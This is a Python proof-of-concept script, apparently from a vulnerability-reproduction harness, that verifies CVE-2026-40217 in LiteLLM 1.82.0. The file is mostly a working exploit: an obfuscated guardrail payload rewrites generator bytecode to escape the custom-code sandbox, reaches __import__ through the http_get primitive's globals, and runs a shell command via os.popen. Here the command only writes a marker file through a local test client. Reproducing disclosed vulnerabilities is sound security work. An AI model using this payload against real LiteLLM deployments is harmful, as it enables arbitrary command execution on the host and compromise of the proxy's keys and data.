"""CVE-2026-40217 dynamic reproduction (LiteLLM 1.82.0).

The endpoint is admin-authenticated, but the custom-code sandbox is supposed to
contain the code.  The public adapter escapes it with a regex bypass plus
CPython bytecode rewriting and reaches ``__import__`` through the sandbox's
``http_get`` primitive.  The PoC uses FastAPI TestClient (no external network)
and proves execution by writing a marker file.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import poclib  # noqa: E402


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    master = "sk-inkblade-upstream-verify"
    os.environ["LITELLM_MASTER_KEY"] = master
    os.environ.setdefault("LITELLM_LOCAL_MODEL_COST_MAP", "True")

    import litellm.proxy.proxy_server as proxy
    from fastapi.testclient import TestClient

    proxy.master_key = master
    marker = str(poclib.MARKER_FILE).replace("\\", "\\\\")
    text = poclib.MARKER_TEXT
    poclib.start_marker("ABSENT")

    code = f'''def apply_guardrail(inputs, request_data, input_type):
    obj = str.mro()[1]
    def g(fn):
        yield fn.placeholder
    c = g(None).gi_code
    gn = "_" + "_gl" + "ob" + "als" + "_" + "_"
    cn = "_" + "_co" + "de_" + "_"
    obj.__setattr__(g, cn, c.replace(co_names=(gn,)))
    for v in g(http_get):
        gd = v
        break
    bn = "_" + "_bu" + "ilt" + "ins" + "_" + "_"
    imp = gd[bn]["_" + "_im" + "po" + "rt_" + "_"]
    return {{"rce": imp("os").popen("echo {text} > \\"{marker}\\"").read()}}'''

    client = TestClient(proxy.app)
    response = client.post(
        "/guardrails/test_custom_code",
        headers={"Authorization": f"Bearer {master}"},
        json={"custom_code": code, "test_input": {"texts": ["x"]}, "input_type": "request"},
    )
    body = response.text[:2000]

    if not poclib.marker_ok():
        poclib.fail(
            "guardrail sandbox escape did not execute",
            http_status=response.status_code,
            response=body,
        )

    poclib.finish_verified(
        {
            "request_response": [
                {
                    "method": "POST",
                    "route": "/guardrails/test_custom_code",
                    "auth": "LITELLM_MASTER_KEY (proxy_admin)",
                    "http_status": response.status_code,
                    "response": body,
                    "payload": "bytecode co_names rewrite -> http_get.__globals__['__builtins__']['__import__']",
                }
            ],
            "transport": {
                "type": "http+asgi-testclient",
                "package": manifest.get("version_ref", {}).get("package"),
                "version": manifest.get("version"),
                "python": sys.version.split()[0],
            },
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
